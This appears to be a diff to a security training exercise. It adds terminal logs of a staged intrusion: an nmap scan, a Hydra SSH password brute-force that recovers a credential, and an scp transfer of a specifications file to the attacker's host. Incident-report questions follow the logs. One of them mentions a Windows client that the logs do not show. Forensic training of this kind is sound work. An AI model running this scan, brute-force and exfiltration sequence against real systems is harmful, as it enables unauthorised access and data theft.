@@ -57,6 +57,40 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-06 17:22:
 
 
 
+square@AT4K-3XPR3S:~/BUREAU.01$ nmap -T1 -p 22,80,443,3306 TECH-BUREAU
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-09 18:08 CET
+Nmap scan report for TECH-BUREAU (192.168.1.10)
+Host is up (0.00046s latency).
+
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   closed http
+443/tcp  closed https
+3306/tcp open   mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 75.07 seconds
+square@AT4K-3XPR3S:~/BUREAU.01$ hydra -l lead_engineer -P BUREAU_WORDLIST.txt -t 1 -w 5 ssh://TECH-BUREAU
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-09 18:11:06
+[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
+[DATA] attacking ssh://TECH-BUREAU:22/
+[22][ssh] host: TECH-BUREAU   login: lead_engineer   password: 4-4-4-4
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-09 18:11:40
+square@AT4K-3XPR3S:~/BUREAU.01$ 
+
+
+lead_engineer@TECH-BUREAU-UBUNTU-24:~/PROJECT.5527$ scp  Frame_specs.txt square@192.168.1.16:/home/square/Desktop
+square@192.168.1.16's password: 
+Frame_specs.txt                                                                        100%  399   226.1KB/s   00:00    
+lead_engineer@TECH-BUREAU-UBUNTU-24:~/PROJECT.5527$ 
+
+
+
+
+
+
 #### **TASK:**
 For this exercise, answer the following questions for your incident report:
     * What is the IP address of the infected Windows client?
